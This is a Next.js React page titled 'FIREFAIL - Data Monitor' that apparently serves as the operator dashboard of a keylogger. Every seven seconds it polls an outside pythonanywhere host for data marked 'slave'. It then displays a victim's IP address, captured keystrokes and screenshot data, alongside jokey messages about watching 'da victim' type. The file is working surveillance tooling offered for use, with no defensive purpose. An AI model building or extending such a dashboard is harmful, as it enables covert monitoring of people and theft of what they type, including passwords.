"use client"

import React, { useState, useEffect } from "react"
import Head from "next/head"
import Image from "next/image"
import Navbar from "../components/ui/navbar"
import axios from "axios"

async function receiveData() {
  try {
      const response = await axios.get('http://swadheenmishra123.pythonanywhere.com/send_data?Type=slave')
      response.data['timestamp'] = new Date(Date.now()).toISOString()
      return response.data
  }
  catch (error) {
      console.error(error)
      return null
  }
}

// Mock data for demonstration - in a real app, this would come from an external source
const initialMessages = [
  {
    data: "/images/logo.png",
    response: "System initialized (sorta). Monitoring da victim... for now.",
    timestamp: new Date(Date.now() - 3600000).toISOString(),
    type: "image",
  },
  {
    data: "192.168.1.1",
    response: "Connection established with alecc pindey.",
    timestamp: new Date(Date.now() - 1800000).toISOString(),
    type: "ip",
  },
  {
    data: ["A", "B", "C"],
    response: "jus received some inputs.",
    timestamp: new Date(Date.now() - 900000).toISOString(),
    type: "keys",
  },
]

export default function DataPage() {
  const [messages, setMessages] = useState(initialMessages)
  const [currentTime, setCurrentTime] = useState(new Date().toLocaleTimeString())

  // Update time every second
  useEffect(() => {
    // Set initial time immediately on client
    setCurrentTime(new Date().toLocaleTimeString())

    const timer = setInterval(() => {
      setCurrentTime(new Date().toLocaleTimeString())
    }, 1000)

    return () => clearInterval(timer)
  }, [])

  // Fetch new data periodically
  useEffect(() => {
    const fetchNewData = async () => {
      try {
        const data = await receiveData();
        if (data) {
          const timestamp = data['timestamp'];
          const base64img = data['data'][2];
          const keystrokes = data['data'][0];
          const ip = data['data'][1];
          
          // Create new message objects
          const newIpMessage = {
            data: ip,
            response: `Just got their IP lol`,
            timestamp: timestamp,
            type: "ip",
          };
          
          const newKeysMessage = {
            data: keystrokes.split(''),
            response: `they've been typing some mad shit as well here look at dis`,
            timestamp: timestamp,
            type: "keys",
          };
          
          // Update state with new messages
          setMessages(prev => [...prev, newIpMessage, newKeysMessage]);
        }
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };

    // Initial fetch
    fetchNewData();
    
    // Set interval for periodic fetching
    const messageTimer = setInterval(fetchNewData, 7000);

    return () => clearInterval(messageTimer);
  }, []);

  // Function to render different data types
  const renderData = (message) => {
    switch (message.type) {
      case "image":
        return (
          <div className="relative w-16 h-16 rounded-lg overflow-hidden bg-gray-800 bg-opacity-50">
            <Image
              src={message.data || "/placeholder.svg"}
              alt="Data visualization"
              width={64}
              height={64}
              objectFit="cover"
              className="opacity-70"
            />
          </div>
        )
      case "ip":
        return <div className="px-3 py-1 bg-gray-800 bg-opacity-30 rounded-lg text-xs font-mono">{message.data}</div>
      case "keys":
        return (
          <div className="flex space-x-1">
            {Array.isArray(message.data) ? message.data.map((key, i) => (
              <span key={i} className="px-2 py-1 bg-gray-800 bg-opacity-30 rounded text-xs font-mono">
                {key}
              </span>
            )) : <span className="px-2 py-1 bg-gray-800 bg-opacity-30 rounded text-xs font-mono">{message.data}</span>}
          </div>
        )
      default:
        return <div className="px-3 py-1 bg-gray-800 bg-opacity-30 rounded-lg text-sm">{message.data}</div>
    }
  }

  return (
    <React.Fragment>
      <Head>
        <title>FIREFAIL - Data Monitor</title>
      </Head>

      <Navbar />

      <div className="flex flex-col h-screen bg-gray-900 bg-opacity-70 backdrop-blur-sm pt-16">
        {/* Header */}
        <div className="flex items-center justify-between p-4 border-b border-gray-700 border-opacity-50">
          <div className="flex items-center space-x-3">
            <div className="relative w-10 h-10">
              <Image src="/images/logo.png" alt="Monitor Logo" width={40} height={40} className="rounded-full opacity-70" />
            </div>
            <div>
              <h1 className="text-xl font-bold text-gray-400">Terminal Monitor</h1>
              <p className="text-xs text-gray-500">Passive data collection active</p>
            </div>
          </div>
          <div className="text-sm text-gray-500 font-mono" suppressHydrationWarning>
            {currentTime}
          </div>
        </div>

        {/* Message display area - one way only */}
        <div className="flex-1 overflow-y-auto p-4 space-y-4">
          {messages.map((message, index) => (
            <div key={index} className="flex max-w-full">
              <div className="flex flex-col space-y-2 p-3 rounded-lg bg-gray-800 bg-opacity-30 backdrop-blur-sm border border-gray-700 border-opacity-30">
                {renderData(message)}

                <p className="text-gray-400">{message.response}</p>

                <div className="text-right">
                  <span className="text-xs text-gray-500" suppressHydrationWarning>
                    {new Date(message.timestamp).toLocaleTimeString([], {
                      hour: "2-digit",
                      minute: "2-digit",
                      second: "2-digit",
                    })}
                  </span>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </React.Fragment>
  )
}